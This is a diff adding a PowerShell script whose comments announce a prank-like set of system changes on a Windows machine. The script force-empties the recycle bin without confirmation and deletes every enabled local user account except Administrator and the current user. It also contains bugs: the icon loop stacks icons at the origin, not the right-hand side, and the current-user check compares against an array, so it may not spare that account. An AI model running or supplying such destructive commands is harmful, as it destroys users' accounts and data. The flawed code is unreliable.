@@ -1,0 +1,50 @@
+#Moves all desktop icons to the right-hand side.
+#Empties the recycle bin.
+#Deletes all user accounts except for the Administrator and the currently logged-in user.
+#Changes the desktop background color to red.
+
+
+
+
+# Move all desktop icons to the right-hand side
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class User32 {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
+}
+"@
+
+$desktopHandle = [User32]::FindWindow("Progman", "Program Manager")
+$folderViewHandle = [User32]::FindWindowEx($desktopHandle, [IntPtr]::Zero, "SHELLDLL_DefView", $null)
+$listViewHandle = [User32]::FindWindowEx($folderViewHandle, [IntPtr]::Zero, "SysListView32", $null)
+
+# LVIF_TEXT = 0x0001, LVM_GETITEMTEXT = 0x102D, LVM_SETITEMPOSITION = 0x1000 + 15
+$LVM_SETITEMPOSITION = 0x1000 + 15
+$iconCount = [User32]::SendMessage($listViewHandle, 0x1000 + 4, [IntPtr]::Zero, [IntPtr]::Zero)
+
+for ($i = 0; $i -lt $iconCount; $i++) {
+    [User32]::SendMessage($listViewHandle, $LVM_SETITEMPOSITION, [IntPtr]$i, [IntPtr]::Zero)
+}
+
+# Empty the recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+# Delete all users except Administrator and the current user
+$currentUsername = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')
+$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True AND Disabled=False"
+
+foreach ($user in $users) {
+    if ($user.Name -ne "Administrator" -and $user.Name -ne $currentUsername) {
+        Remove-LocalUser -Name $user.Name
+    }
+}
+
+# Change the background color to red
+Set-ItemProperty -Path 'HKCU:\Control Panel\Colors' -Name 'Background' -Value '255 0 0'
+RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
